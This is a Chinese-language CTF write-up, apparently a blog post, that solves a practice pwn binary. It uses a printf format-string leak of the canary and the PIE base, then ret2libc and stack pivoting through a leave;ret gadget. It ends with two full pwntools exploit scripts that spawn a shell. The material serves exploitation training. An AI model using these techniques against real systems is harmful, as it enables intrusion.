# 【1】格式化字符串，栈迁移到栈

> 一道用于练习 printf 格式化字符串漏洞的题目的一种可能解法。

## 题目信息

### checksec

![image-20221113200217201](E:\Pictures\markdown\image-20221113200217201.png)

[题目链接](https://pan.baidu.com/s/1xfGWKGKwVqgGVzrc95zgjA?pwd=2333) 找 `blog1_blog1` 文件夹

1. 有 PIE，有 canary，栈上不可执行

2. 有 puts 的 got 和 plt

### elf

![image-20221113154554924](E:\Pictures\markdown\image-20221113154554924.png)

题目很直球，执行完是这样的

1. **leak_stack** 选项，

	![image-20221113154658214](E:\Pictures\markdown\image-20221113154658214.png)

  很直接的格式化字符串漏洞

2. **leak_libc** 选项，

	![image-20221113154724044](E:\Pictures\markdown\image-20221113154724044.png)

  **buf** 大小为 **(0x70 - 0x8) Bytes**，可以往其中输入 **0x78 Bytes** 的内容，这里很明显是仅可以覆盖到 **ret**

3. **rop** 选项，

	![image-20221113154824117](E:\Pictures\markdown\image-20221113154824117.png)

	不同于 **leak_libc** 选项，这个 **rop** 可以完全容纳 `pop_rdi_ret + puts_got + puts_plt` 以及之后的 `pop_rdi_ret + str_bin_sh + system` 来 getshell 的
	
4. **Exit**

## 不完整的题解

**（以下为不完整解法，正确题解可以直接跳到 [这里](#正确的题解)）**

题目的正常思路如下，

1. 利用 **leak_stack** 泄露 **canary**
2. 利用 **leak_stack** 还泄露可以泄露栈上某些函数的地址，减去偏移（末三位）可以得到程序的基址
4. 利用程序基址拿 **puts_plt**，**puts_got**，**pop_rdi_ret**
5. 在 **rop** 函数中 `p64(canary) + p64(8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt)` 泄露 **libc_base**
6. 利用泄露的 **libc_base** 构造 **rop**，再回去 **rop** 利用 **rop ret2libc**

### 1. 泄露 canary

> 格式化字符串漏洞原理

首先简单介绍一下格式化字符串的参数：

`%p（十六进制）`，`%x（小写，十六进制，不带 0x）`，`%X（大写，十六进制，不带 0X）`，表示将指针指到的**地址中的内容**打印出来，每打印一行，指针向下移动一个地址单位，这里的地址就是栈上的地址，例如 `0x7ffd13897330`、`0x7ffd13897338` 等

![image-20221113155718460](E:\Pictures\markdown\image-20221113155718460.png)

如图所示，蓝色框对应栈上、以及寄存器对应地址里相应的内容（第 7 个开始就是从 **0x7ffd13897330** 开始的内容）

接下来关注红色框中的数据，压在 rbp 之上，所以就是我们要找的 canary 了**（每次重新启动程序都会改变，本文后续在重新启动题目后也会改变）**

> 寻找正确的偏移，以泄露 canary 的值

1. 在上一张图中，可以通过数数，红框位置相对输入的 **aaaab** 偏移于第 15 个位置（不算自身，并且 64 位和 32 位确定偏移的方式有些许不同）

2. 还有另一种逃课方法，这个需要 **pwndbg** 调试，在对应的 **printf** 函数被调用处下断点，然后使用指令 `fmtarg <想要泄露内容的地址>`，如图所示

	<img src="E:\Pictures\markdown\image-20221113160139206.png" alt="image-20221113160139206" style="zoom:80%;" />
	
	图中篮框是已经下过断点导致程序在 **printf** 这里卡住，红框是想要被泄露的内容，得到 `%14$p`，将这里的 **14** 加 **1** 即可
	

于是我们可以通过构造 payload：`aaab%15$p`，来泄露 canary 的地址，这里的 `aaab` 是为了方便 python 脚本确定要接收的位置

### 2. 泄露程序的基址

通过上一步得到程序 stack 上的 canary 后，就可以随意摆布 stack 了，为了利用 **rop** 选项泄露 **libc_base**，就必须先知道 **puts_plt**、**puts_got**、**pop_rdi_ret** 的地址

可以利用相对偏移的方式获取到这些地址，下表为通过 `objdump -D ./blog1 | grep <函数名>`，`ROPgadget --binary ./blog1 | grep "pop rdi"` 得到的内容

| 函数名       | 静态未加载时的偏移 | 动态装载后的偏移（每次都不同，但偏移量是相同的） |
| ------------ | ------------------ | ------------------------------------------------ |
| main         | 0x13d5             | 0x55cdb8d363d5                                   |
| **程序基址** | **0x0000**         | **0x55cdb8d363d5 - 0x13d5 = 0x55cdb8d35000**     |
| puts@plt     | 0x10b0             | 0x55cdb8d35000 + 0x10b0 = 0x55cdb8d360b0         |
| puts@plt.got | 0x3fa0             | 0x55cdb8d35000 + 0x3fa0 = 0x55cdb8d38fa0         |
| pop_rdi_ret  | 0x14d3             | 0x55cdb8d35000 + 0x14d3 = 0x55cdb8d364d3         |

**main** 函数的地址在栈上是可得的，可以利用 **leak_stack** 确定合适偏移后泄露这个地址，再根据上表中的内容来泄露其他信息

![image-20221113202816897](E:\Pictures\markdown\image-20221113202816897.png)

如图所示，程序在栈上存了 **main** 函数加载后的地址，于是可以通过 `aaab%13$p` 来获取这个地址并进行运算得到其他地址信息

### 3. 泄露 libc 基址

拿到了程序基址 = 拿到了 **puts_plt**、**puts_got**、**pop_rdi_ret**

拿到了 canary = 随意控制栈中的内容

输入的大小超过缓冲区大小，并覆盖到合适的位置 = 随意劫持程序流

理想很美好，

| stack 位置（仅显示偏移） | 注释                  |
| ------------------------ | --------------------- |
| 0x70                     | buf 开始的地方        |
| ...                      |                       |
| 0x08                     | canary                |
| 0x00                     | rbp                   |
| -0x08                    | ret，放 `pop_rdi_ret` |
| -0x10                    | 放 `puts_got`         |
| -0x18                    | 放 `puts_plt`         |

但是在这里设置了一个坑，即第二个选项 **leak_libc** 中输入大小仅能覆盖到 **ret**（即 -0x08 的位置），这明显不足以塞下三个参数

这里就可以利用到 **栈迁移** 技术了，但是为了方便加深印象，还是先把足够长度的情况下的 **ret2libc** 做完（即选项 **3.rop**），如果已经了解后面的内容，可以直接跳转到 [利用栈迁移的题解](#进阶的题解)

1. 进入到 **rop** 选项，是足以构造完整 payload 的，首先是泄露 **libc_base** 基地址

  `b'a' * (0x70 - 0x8) + p64(canary) + b'b' * 0x8 + p64(bin_pop_rdi_ret) + p64(bin_puts_got) + p64(bin_puts_plt) + p64(bin_func_main)`

![image-20221114205357670](E:\Pictures\markdown\image-20221114205357670.png)

2. 得到基地址即可构造 `system('/bin/sh')` 来 getshell 了

  `payload = b'a' * (0x70 - 0x8) + p64(canary) + b'b' * 0x8 + p64(bin_pop_rdi_ret) + p64(libc_str_bin_sh) + p64(libc_system)`

![image-20221114205716142](E:\Pictures\markdown\image-20221114205716142.png)

至此，一套完整的 **rop** 流程结束

## 进阶的题解

> 进阶方式，**栈迁移**

但是如果，用选项 **2. leak_libc** 仅能覆盖到 ret 来 getshell 又该何如呢

显然我们是无法通过输入来覆盖到 **-0x10、-0x18** 的位置的，这里介绍栈迁移技术：

1. 观察函数在调用和返回时的栈的变化（栈向低地址生长）

	![call 函数调用时栈的变化](E:\Pictures\markdown\image-20221117181342306.png)

	关注 **rsp（栈顶）**、**rbp（栈底）** 中内容的变化，这两个寄存器的值规划着当前工作栈的区间

	![ret 时栈的变化](E:\Pictures\markdown\image-20221117181434423.png)

2. 仔细观察两张图中间部分的状态可以得知，栈实际上是用 **rbp** 的值来确定栈底位置的。如果人为的修改了 **保存在栈上的 rbp** 的值（图中 **0x1028** 的位置中的 **值**）则可以控制栈的区间位置到不同的地方。例如，将位置 **0x1028** 中的值 **调用者的 rbp 地址** 修改为 **0x1060**，则返回后的栈的变化被修改如下

	![人为修改](E:\Pictures\markdown\image-20221117182649835.png)

	由此可以提出一个想法，在 **2.leak_libc** 中，只足以覆盖到 ret，但是足够修改子函数的 **rbp** 的值，如果将这个值修改成可以被控制的区域（例如原 buf 到 ret 这段栈空间之间），同时在相应的 **新的 ret** 的位置布置好 rop，则可以达到劫持程序流的效果（解决了 buf 溢出不够的问题）

	![image-20221117183547744](E:\Pictures\markdown\image-20221117183547744.png)

	本题中栈上内容的布置如下

	![image-20221117193042344](E:\Pictures\markdown\image-20221117193042344.png)

	其中 **bin_leave_ret** 是 **leave** 操作码的位置（mov rsp, rbp; pop rbp），即将栈顶拉到 **0x1018** 的位置，然后把父函数的父函数的 rbp 恢复（劫持了父函数的栈，但是还得保持爷函数的栈得是正常的）

	通过这样提前布置好 rop 使得在栈迁移后，ret 到了 rop 上，其他的内容就不赘述了，只要注意理解一下 exp 中关于布置栈迁移的 payload 就好
	
	![image-20221117213433277](E:\Pictures\markdown\image-20221117213433277.png)

## EXP

> 栈溢出位置充足

```python
# -*- coding: utf-8 -*-

from pwn import *
import pwn

context(log_level='debug', )
fileName = './blog1'

p = process(fileName)
elf = ELF(fileName)

p64 = pwn.p64
u64 = pwn.u64

'''
[*] '/home/wkyuu/Desktop/temp/blog1'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
'''

# bin
bin_func_main = elf.sym['main']
bin_puts_plt = elf.sym['puts']
bin_puts_got = elf.got['puts']
bin_pop_rdi_ret = 0x14d3    # ROPgadget --binary blog1 | grep "pop rdi"

# libc
libc_puts = 0x75db0
libc_system = 0x4a490
libc_str_bin_sh = 0x1b3115


def logger(msg, value=None, type='info'):  # type True for value
    if type == 'info':
        log.info(
            '================================ {} ================================\n'.format(msg))
    else:
        log.success('# {} => {}\n'.format(msg, value))


# leak_canary
logger('leak_canary')
payload = b'aaab%15$p'  # aaab.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
p.sendlineafter(b'Your choice:', b'1')
p.sendlineafter(b'try to leak stack\n', payload)
p.recv(4)
canary = int(p.recv(18), 16)
logger('canary', hex(canary), 'success')

# leak_func_main
logger('leak_func_main')
payload = b'aaab%13$p'
p.sendlineafter(b'Your choice:', b'1')
p.sendlineafter(b'try to leak stack\n', payload)
p.recv(4)
leak_func_main = int(p.recv(14), 16)
bin_base = leak_func_main - bin_func_main
bin_puts_plt = bin_base + bin_puts_plt
bin_puts_got = bin_base + bin_puts_got
bin_pop_rdi_ret = bin_base + bin_pop_rdi_ret
bin_func_main = bin_base + bin_func_main

logger('bin_base', hex(bin_base), 'success')
logger('leak_func_main', hex(bin_func_main), 'success')
logger('bin_puts_plt', hex(bin_puts_plt), 'success')
logger('bin_puts_got', hex(bin_puts_got), 'success')
logger('bin_pop_rdi_ret', hex(bin_pop_rdi_ret), 'success')

# leak_libc_base
logger('leak_libc_base')
payload = b'a' * (0x70 - 0x8) + p64(canary) + b'b' * 0x8 + p64(bin_pop_rdi_ret) + \
    p64(bin_puts_got) + p64(bin_puts_plt) + p64(bin_func_main)
p.sendlineafter(b'Your choice:', b'3')
p.sendlineafter(b'pwn me\n', payload)
leak_libc_puts = u64(p.recv(6).ljust(8, b'\x00'))

libc_base = leak_libc_puts - libc_puts
libc_system = libc_base + libc_system
libc_str_bin_sh = libc_base + libc_str_bin_sh

logger('libc_base', hex(libc_base), 'success')
logger('leak_libc_puts', hex(leak_libc_puts), 'success')
logger('libc_system', hex(libc_system), 'success')
logger('libc_str_bin_sh', hex(libc_str_bin_sh), 'success')

# rop
logger('rop')
payload = b'a' * (0x70 - 0x8) + p64(canary) + b'b' * 0x8 + p64(bin_pop_rdi_ret) + p64(libc_str_bin_sh) + p64(libc_system)
p.sendlineafter(b'Your choice:', b'3')
p.sendlineafter(b'pwn me\n', payload)

p.interactive()
```

> 栈溢出位置仅能覆盖到 ret

```python
# -*- coding: utf-8 -*-

from pwn import *
import pwn

context(log_level='debug', )
fileName = './blog1'

p = process(fileName)
elf = ELF(fileName)

p64 = pwn.p64
u64 = pwn.u64

'''
[*] '/home/wkyuu/Desktop/temp/blog1'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
'''

# bin
bin_func_main = elf.sym['main']
bin_puts_plt = elf.sym['puts']
bin_puts_got = elf.got['puts']
bin_pop_rdi_ret = 0x14d3    # ROPgadget --binary blog1 | grep "pop rdi"
bin_leave = 0x1376

# libc
libc_puts = 0x75db0
libc_system = 0x4a490
libc_str_bin_sh = 0x1b3115


def logger(msg, value=None, type='info'):  # type True for value
    if type == 'info':
        log.info(
            '================================ {} ================================\n'.format(msg))
    else:
        log.success('# {} => {}\n'.format(msg, value))


def dbg(p=p, gdbscript=""):
    gdb.attach(p, gdbscript=gdbscript)
    pause()


# leak_canary
logger('leak_canary')
payload = b'aaab%15$p'  # aaab.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
p.sendlineafter(b'Your choice:', b'1')
p.sendlineafter(b'try to leak stack\n', payload)
p.recv(4)
canary = int(p.recv(18), 16)
logger('canary', hex(canary), 'success')

# leak_func_main
logger('leak_func_main')
payload = b'aaab%13$p'
p.sendlineafter(b'Your choice:', b'1')
p.sendlineafter(b'try to leak stack\n', payload)
p.recv(4)
leak_func_main = int(p.recv(14), 16)
bin_base = leak_func_main - bin_func_main
bin_puts_plt = bin_base + bin_puts_plt
bin_puts_got = bin_base + bin_puts_got
bin_pop_rdi_ret = bin_base + bin_pop_rdi_ret
bin_func_main = bin_base + bin_func_main
bin_leave = bin_base + bin_leave

logger('bin_base', hex(bin_base), 'success')
logger('leak_func_main', hex(bin_func_main), 'success')
logger('bin_puts_plt', hex(bin_puts_plt), 'success')
logger('bin_puts_got', hex(bin_puts_got), 'success')
logger('bin_pop_rdi_ret', hex(bin_pop_rdi_ret), 'success')
logger('bin_leave', hex(bin_leave), 'success')

# leak_grand_rbp
logger('leak_grand_rbp')
payload = b'aaab%16$p'
p.sendlineafter(b'Your choice:', b'1')
p.sendlineafter(b'try to leak stack\n', payload)
p.recv(4)
grand_rbp = int(p.recv(14), 16)
logger('grand_rbp', hex(grand_rbp), 'success')


# dbg(gdbscript='b *libc+61')

# leak_libc_base
logger('leak_libc_base')
target_rbp = grand_rbp - 0x20 - 0x70 + (0x10 - 0x8) + 0x8
payload = b'a' * (0x10 - 0x8) + p64(canary) + p64(grand_rbp) + p64(bin_pop_rdi_ret) + \
    p64(bin_puts_got) + p64(bin_puts_plt) + p64(bin_func_main) + \
    b'b' * (0x70 - (0x10 - 0x8) - (0x8 * 6) - 0x8) + \
    p64(canary) + p64(target_rbp) + p64(bin_leave)
p.sendlineafter(b'Your choice:', b'2')
p.sendlineafter(b'input sth', payload)

p.recv()
leak_libc_puts = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leak_libc_puts - libc_puts
libc_system = libc_base + libc_system
libc_str_bin_sh = libc_base + libc_str_bin_sh

logger('libc_base', hex(libc_base), 'success')
logger('leak_libc_puts', hex(leak_libc_puts), 'success')
logger('libc_system', hex(libc_system), 'success')
logger('libc_str_bin_sh', hex(libc_str_bin_sh), 'success')


# leak_grand_rbp2   由于破坏了原来的函数调用关系，需要重新创建一次栈迁移的条件
logger('leak_grand_rbp2')
payload = b'aaab%16$p'
p.sendlineafter(b'Your choice:', b'1')
p.sendlineafter(b'try to leak stack\n', payload)
p.recv(4)
grand_rbp = int(p.recv(14), 16)
logger('grand_rbp', hex(grand_rbp), 'success')

# rop
logger('rop')
target_rbp = grand_rbp - 0x20 - 0x70 + (0x10 - 0x8) + 0x8
payload = b'a' * (0x10 - 0x8) + p64(canary) + p64(grand_rbp) + p64(bin_pop_rdi_ret) + \
    p64(libc_str_bin_sh) + p64(libc_system) + p64(bin_func_main) + \
    b'b' * (0x70 - (0x10 - 0x8) - (0x8 * 6) - 0x8) + \
    p64(canary) + p64(target_rbp) + p64(bin_leave)

p.sendlineafter(b'Your choice:', b'2')
p.sendlineafter(b'input sth', payload)
p.interactive()
```
